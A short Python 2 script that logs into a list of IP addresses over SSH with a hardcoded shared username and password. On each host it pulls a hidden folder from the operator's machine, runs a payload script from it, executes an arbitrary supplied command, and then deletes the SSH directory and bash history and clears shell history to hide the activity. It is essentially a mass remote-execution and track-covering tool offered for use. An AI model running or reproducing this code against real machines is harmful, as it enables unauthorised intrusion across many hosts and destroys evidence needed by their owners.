import pexpect
from pexpect import pxssh
import sys,os,shutil,socket

def xyz(ip,my_ip,argv1,argv2):
	s = pxssh.pxssh()
        host1 = 'iiserb'
        s.force_password = True
	try :
		s.login(ip,host1,host1,login_timeout=1)
		s.sendline(' ping -w1 google.com; echo $?')
		s.prompt()
		x = s.before
                if x[-3]== '1':
                   s.sendline (' scp -r '+host1+'@'+my_ip+':~/.log/ ~/ ')
                   ssh_newkey = 'Are you sure you want to continue connecting'
                   j = s.expect([ssh_newkey,'password:',pexpect.EOF])
                   if j == 0:
                        s.sendline('yes')
                        s.sendline(host1)
                   else :
                        s.sendline(host1)
                   s.sendline(' /usr/bin/python3 ~/.log/k.py '+ argv2)
                   s.sendline(' rm -r ~/.log/  ~/.ssh/  ~/wget-log ~/.bash_history')
                   s.sendline(argv1)
                   s.sendline(' history -c')
                   s.logout()      
                else:
                    s.sendline(argv1)
                    s.sendline(' rm -r ~/.ssh ~/wget-log ~/.bash_history')
                    s.sendline(' history -c')
                    s.logout()

	except Exception as e :
		print "chal gya"


def main():
        my_ip =[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]
        with open(sys.argv[1],'r') as f:
	    ips = [ip.strip() for ip in f.readlines()]
	for ip in ips:
            print ip
    	    xyz(ip,my_ip,sys.argv[2],sys.argv[3])

if __name__ == "__main__":
     if os.path.exists("/home/iiserb/.log"):
        main()
        #shutil.rmtree("~/.log")
     else:
        print ".log/ does not exist in ~"
